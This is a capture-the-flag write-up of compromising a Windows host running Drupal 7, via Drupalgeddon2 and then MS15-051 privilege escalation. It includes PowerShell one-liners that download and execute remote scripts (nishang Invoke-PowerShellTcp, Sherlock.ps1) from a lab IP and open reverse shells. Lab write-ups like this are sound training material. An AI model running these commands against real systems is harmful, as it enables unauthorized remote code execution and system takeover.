# Writeup
## Recon 
- Using nmapAutomator.sh to do initial recon (automates nmap, nikto, ffuf, etc.)

- Found that port 80, 135 were open. Notably found a Drupal 7 instance, which means...

## Initial Access
- Used the drupalgeddon2 vulnerability PoC 44449.rb (modified try_phpshell boolean to false) to get remote command execution

![29d54517ba27b6db8377b29cf1b4a978.png](../../_resources/29d54517ba27b6db8377b29cf1b4a978-1.png)

![34dbbefb1ad62eb010f1e4b68d059e42.png](../../_resources/34dbbefb1ad62eb010f1e4b68d059e42-1.png)

- Enumerated basic system information for greater foothold on the system. It seems that there have been no patches applied...

![5a871f90a581ef7ae4171b2515e577af.png](../../_resources/5a871f90a581ef7ae4171b2515e577af-1.png)

![1587ec235932360adff197f8f2701dc8.png](../../_resources/1587ec235932360adff197f8f2701dc8-1.png)

- Uploaded netcat (nc64.exe) for a more stable shell

![3032b25c113c547b2ae147414c91430a.png](../../_resources/3032b25c113c547b2ae147414c91430a-1.png)

![874291b741846d2daeccbc4d7ab6db5d.png](../../_resources/874291b741846d2daeccbc4d7ab6db5d-1.png)

![8e4f74c577e0d435df03a38b5b02fad6.png](../../_resources/8e4f74c577e0d435df03a38b5b02fad6-1.png)

![39040504b8228e20d25d26276fedc492.png](../../_resources/39040504b8228e20d25d26276fedc492-1.png)

- Activating netcat reverse shell for initial access

![b5da1ada308dd41820252e97bc4209da.png](../../_resources/b5da1ada308dd41820252e97bc4209da-1.png)

![e96d03b769e7c16030b14a2cd9835bbe.png](../../_resources/e96d03b769e7c16030b14a2cd9835bbe-1.png)

![4bc52e2b1b4b2a3932c2c0e8f3bbdfcb.png](../../_resources/4bc52e2b1b4b2a3932c2c0e8f3bbdfcb-1.png)

- User flag done!

![7c00add354a0d006c5b086cb715591aa.png](../../_resources/7c00add354a0d006c5b086cb715591aa-1.png)

- Note: there is a better way of gaining initial access with the nishang shell, so here is the approach: 

- First, host the nishang shell and start a netcat listener

![e7150b12444457fe4e2c12eaf7b9754b.png](../../_resources/e7150b12444457fe4e2c12eaf7b9754b-1.png)

![57043b30f9a8a0b6fb1a62adeb24d3b1.png](../../_resources/57043b30f9a8a0b6fb1a62adeb24d3b1-1.png)

- Then, use RCE to activate nishang remotely

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 1234
```

![9cf43e30acf4e148ac1742f27853c47d.png](../../_resources/9cf43e30acf4e148ac1742f27853c47d-1.png)

![a9a7d2e4107c2c38933857107ba0032c.png](../../_resources/a9a7d2e4107c2c38933857107ba0032c-1.png)

## Privilege Escalation
- Getting Sherlock.ps1 to run was actually kind of a pain. In the end, I had to pipe the IEX command to a new instance of powershell with the noprofile flag

```
echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10:8000/Sherlock.ps1') | powershell -noprofile -
```

![e0069b51e38cb213b6291de43df4aec2.png](../../_resources/e0069b51e38cb213b6291de43df4aec2-1.png)

![73e2e1c0b15fdc2f0a370986ae77240b.png](../../_resources/73e2e1c0b15fdc2f0a370986ae77240b-1.png)

- After trying various exploits, I decided that MS15-051 would work the best in this case (elevated commands could be executed directly with the binary itself, so the plan is to get an elevated shell by using nc64.exe to open a reverse shell)

https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip

- Downloading the exploit binary with Powershell (nishang) was straightforward (again serve the file with a temporary http server)

```
(New-Object Net.WebClient).DownloadFile('http://10.10.14.10:8000/ms15-051x64.exe', 'ms15-051x64.exe')
```

- Downloading netcat (nc64.exe) was similar.

- Finally I started a netcat listener on Kali (port 4321 this time), and executed the following to open an elevated reverse shell 

![ff9cb5d2fc3000890d3e79f43bfdc52b.png](../../_resources/ff9cb5d2fc3000890d3e79f43bfdc52b-1.png)

- Privilege escalation done!

![ab4652ba2074a1397a9e40c6d5ed1f71.png](../../_resources/ab4652ba2074a1397a9e40c6d5ed1f71-1.png)

- Root flag done!

![5502c70adc2f2e859aac743c95e9ea83.png](../../_resources/5502c70adc2f2e859aac743c95e9ea83-1.png)

